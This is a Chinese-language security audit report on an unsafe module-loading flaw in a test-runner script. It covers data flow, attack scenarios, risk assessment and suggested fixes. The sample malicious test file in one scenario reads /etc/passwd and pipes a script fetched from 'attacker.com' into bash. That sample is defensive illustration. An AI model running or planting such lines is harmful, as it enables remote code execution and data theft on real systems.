# VULN-013：不安全模块加载漏洞

## 漏洞基本信息

| 属性 | 值 |
|------|-----|
| ID | VULN-013 |
| 类型 | Unsafe Module Loading |
| CWE | CWE-669 (Incorrect Resource Transfer Between Spheres) |
| 严重性 | High |
| 置信度 | 90% |
| 状态 | CONFIRMED |
| 文件 | `scripts/torch_extension/torch_extension_ut_runner.py` |
| 行号 | 40-48 |
| 函数 | `load_tests_from_file`, `main` |

## 源代码分析

### 漏洞代码位置

```python
# 第 40-48 行
def load_tests_from_file(test_file):
    """从单个文件加载测试"""
    module_name = test_file.stem
    spec = importlib.util.spec_from_file_location(module_name, test_file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)  # 危险：执行任意代码

    loader = unittest.TestLoader()
    return loader.loadTestsFromModule(module)
```

### 数据流追踪

```
sys.argv[1] (命令行参数)
    ↓
YAML 配置文件路径
    ↓
yaml.safe_load(f)['test_dirs'] (YAML 配置解析)
    ↓
test_dir_path.glob('test_*.py') (文件发现)
    ↓
load_tests_from_file(test_file) (动态加载)
    ↓
importlib.util.spec_from_file_location() + exec_module()
    ↓
任意 Python 代码执行
```

### main() 函数关键逻辑

```python
def main():
    # 从命令行获取 YAML 配置文件路径 - 无验证
    with open(sys.argv[1], 'r') as f:
        test_dirs = yaml.safe_load(f)['test_dirs']

    # 遍历配置中的目录 - 无路径验证
    for test_dir in test_dirs:
        test_dir_path = Path(test_dir)
        if test_dir_path.exists():
            # 匹配所有 test_*.py 文件
            test_files.extend(test_dir_path.glob('test_*.py'))

    # 对每个文件执行动态加载
    for test_file in test_files:
        tests = load_tests_from_file(test_file)  # 代码执行点
```

## 攻击向量分析

### 攻击场景 1: 恶意 YAML 配置注入

**前提条件**:
- 攻击者能控制传递给脚本的 YAML 配置文件路径
- 攻击者能在指定路径放置恶意 YAML 文件

**攻击步骤**:
1. 创建恶意 YAML 配置文件 `malicious.yaml`:
   ```yaml
   test_dirs:
     - /tmp/malicious_tests
   ```

2. 在 `/tmp/malicious_tests/` 目录创建恶意测试文件 `test_evil.py`:
   ```python
   # test_evil.py
   import os
   import subprocess
   
   # 恶意代码在模块加载时执行
   subprocess.run(['cat', '/etc/passwd'])
   os.system('curl attacker.com/shell.sh | bash')
   
   # 伪装成正常测试
   class TestFake:
       def test_nothing(self):
           pass
   ```

3. 触发执行:
   ```bash
   python torch_extension_ut_runner.py /tmp/malicious.yaml
   ```

**结果**: 恶意代码在 `spec.loader.exec_module(module)` 时被执行

### 攻击场景 2: 供应链攻击

**前提条件**:
- 攻击者能向代码仓库提交代码
- CI/CD 流程使用此脚本运行测试

**攻击步骤**:
1. 在合法测试目录中添加恶意测试文件
2. 文件名符合 `test_*.py` 模式
3. 恶意代码在测试导入时执行

### 攻击场景 3: 目录遍历 + 文件放置

**前提条件**:
- 攻击者有写入特定目录的权限
- 用户运行了包含该目录的 YAML 配置

**攻击步骤**:
1. 在已有 test_dirs 配置中的目录放置恶意文件
2. 文件被正常扫描流程发现并加载

## 利用复杂度评估

### 利用难度: 中等

| 因素 | 评估 |
|------|------|
| 需要文件系统访问 | 是 |
| 需要控制 YAML 路径 | 是 |
| 需要代码执行环境 | 是 |
| 攻击链复杂度 | 2 步 |
| 所需权限 | 文件写入权限 |

### 实际影响评估

| 影响维度 | 评估 |
|----------|------|
| 代码执行 | 完全控制 |
| 权限提升 | 取决于执行用户权限 |
| 数据泄露 | 可访问执行用户可访问的所有数据 |
| 横向移动 | 取决于网络环境 |
| 持久化 | 可通过修改文件实现 |

## 缓解因素分析

### 降低风险的因素

1. **内部工具**: 这是一个内部测试运行器，不是面向外部用户的服务
2. **需要前置条件**: 攻击者需要已有文件系统访问权限
3. **权限等效性**: 如果攻击者已有文件系统访问权限，有更直接的攻击方式
4. **设计目的**: 该工具的设计目的就是加载并执行测试文件
5. **配套工具**: `generate_ut_task_yaml.py` 会生成包含项目内部路径的配置

### 配套工具分析

`generate_ut_task_yaml.py` 的安全特性:
- 从固定模式搜索测试目录 (`*/tests/ut/torch_extension`)
- 使用绝对路径
- 不接受外部任意路径输入

## 安全缺陷分析

### 缺失的安全控制

1. **路径验证缺失**:
   ```python
   # 当前代码 - 无验证
   for test_dir in test_dirs:
       test_dir_path = Path(test_dir)
       # 应该验证路径是否在预期范围内
   ```

2. **文件来源验证缺失**:
   - 不检查文件是否来自可信来源
   - 不检查文件签名或哈希

3. **权限边界模糊**:
   - 没有限制可以加载的目录范围
   - 可以加载任意路径的 Python 文件

## 建议修复方案

### 方案 1: 路径白名单验证

```python
ALLOWED_TEST_BASE_DIRS = [
    Path(__file__).parent.parent.parent,  # 项目根目录
]

def validate_test_path(test_path: Path) -> bool:
    """验证测试路径是否在允许的目录范围内"""
    abs_path = test_path.resolve()
    for allowed_dir in ALLOWED_TEST_BASE_DIRS:
        try:
            abs_path.relative_to(allowed_dir.resolve())
            return True
        except ValueError:
            continue
    return False

def main():
    # ... 现有代码 ...
    
    for test_dir in test_dirs:
        test_dir_path = Path(test_dir)
        # 添加路径验证
        if not validate_test_path(test_dir_path):
            logging.warning(f"Skipping untrusted path: {test_dir_path}")
            continue
        # ... 后续处理 ...
```

### 方案 2: YAML 配置签名验证

```python
import hashlib

def verify_yaml_integrity(yaml_path: Path, expected_hash: str) -> bool:
    """验证 YAML 文件的完整性"""
    with open(yaml_path, 'rb') as f:
        content = f.read()
    actual_hash = hashlib.sha256(content).hexdigest()
    return actual_hash == expected_hash
```

### 方案 3: 沙箱执行

```python
import restrictedpython

def load_tests_from_file_sandboxed(test_file):
    """在沙箱环境中加载测试"""
    # 使用 RestrictedPython 或类似工具限制代码执行
    pass
```

## 风险评级调整建议

### 原始评级: High

### 调整后评级: Medium (建议)

**理由**:
1. 需要攻击者已有文件系统访问权限
2. 这是内部开发工具，攻击面有限
3. 但代码执行风险仍然存在，特别是在 CI/CD 环境中

## 真实世界影响

### 高风险场景

1. **CI/CD 管道**: 如果 CI 系统以高权限运行此脚本
2. **开发环境**: 开发者机器可能被入侵
3. **共享环境**: 多用户共享的开发服务器

### 低风险场景

1. **本地开发**: 开发者在自己的机器上运行
2. **受控环境**: 有严格访问控制的构建系统

## 结论

### 判定: 真实漏洞 (已确认)

**理由**:
1. 代码确实存在不安全的模块加载行为
2. 攻击路径清晰可利用
3. 符合 CWE-669 定义：在不正确的信任域之间传输资源

**但风险需要根据具体部署环境评估**:
- 在隔离良好的开发环境中风险较低
- 在 CI/CD 环境中风险较高
- 建议实施路径验证等安全控制

## 参考信息

- CWE-669: https://cwe.mitre.org/data/definitions/669.html
- Python importlib 安全: https://docs.python.org/3/library/importlib.html
- 动态代码加载风险: https://owasp.org/www-community/vulnerabilities/Dangerous_Function
